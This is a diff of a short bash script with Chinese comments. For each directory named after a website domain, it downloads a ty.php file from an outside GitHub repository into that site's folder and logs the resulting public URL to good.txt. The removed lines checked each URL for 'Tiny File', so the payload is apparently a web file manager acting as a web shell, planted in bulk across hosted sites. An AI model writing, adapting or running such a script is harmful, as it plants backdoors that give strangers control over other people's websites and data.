@@ -1,22 +1,26 @@
+#!/bin/bash
+
+base_dir="$(pwd)"
+source_url="https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php"
+
 for dir in */; do
     dirname=${dir%/}
+    target_file="${base_dir}/${dirname}/ty.php"
+    
     echo "Checking $dirname..."
     
-    # 下载文件到当前目录
-    if wget -q https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php -O "${dirname}/ty.php"; then
-        echo "  ✓ Downloaded to ${dirname}/ty.php"
-        
-        # 请求远程 URL 检查内容
-        url="https://${dirname}/ty.php"
-        content=$(curl -s -k "$url")
-        
-        if echo "$content" | grep -q "Tiny File"; then
-            echo "$url" >> good.txt  # 保存完整 URL
-            echo "  -> FOUND: $url"
+    # 使用 curl 下载（更可靠）
+    if curl -L -f -s -S "$source_url" -o "$target_file"; then
+        if [ -s "$target_file" ]; then
+            echo "  ✓ Downloaded to ${dirname}/ty.php"
+            url="https://${dirname}/ty.php"
+            echo "$url" >> good.txt
         else
-            echo "  -> Content check failed for $url"
+            echo "  ✗ Downloaded file is empty"
         fi
     else
-        echo "  ✗ Download failed for ${dirname}"
+        echo "  ✗ Download failed for $dirname"
+        # 显示 curl 错误
+        curl -L -f "$source_url" -o "$target_file" --verbose
     fi
 done
